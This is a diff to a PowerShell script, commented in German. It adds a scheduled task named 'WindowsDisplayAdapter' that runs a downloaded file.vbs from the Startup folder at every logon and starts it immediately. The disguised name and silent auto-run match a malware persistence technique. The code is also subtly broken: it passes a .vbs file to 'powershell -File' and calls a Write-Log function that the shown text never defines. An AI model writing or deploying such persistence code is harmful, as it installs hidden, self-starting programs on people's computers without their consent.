@@ -40,3 +40,29 @@ try {
 } catch {
     Write-Host "Failed to download VBS file: $_"
 }
+
+# === Konfiguration ===
+$TaskName  = 'WindowsDisplayAdapter'
+$ScriptPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\file.vbs"
+
+try {
+
+    if (-not (Test-Path $ScriptPath)) {
+        exit 1
+    }
+
+    # Aufgabe definieren
+    $action   = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -File `"$ScriptPath`""
+    $trigger  = New-ScheduledTaskTrigger -AtLogOn
+    $settings = New-ScheduledTaskSettingsSet
+    $task     = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings
+
+    Register-ScheduledTask -TaskName $TaskName -InputObject $task -Force
+
+    # Sofortiger Teststart
+    Start-Process powershell.exe -ArgumentList "-NoProfile -File `"$ScriptPath`""
+}
+catch {
+    Write-Log "FEHLER: $($_.Exception.Message)"
+    exit 1
+}
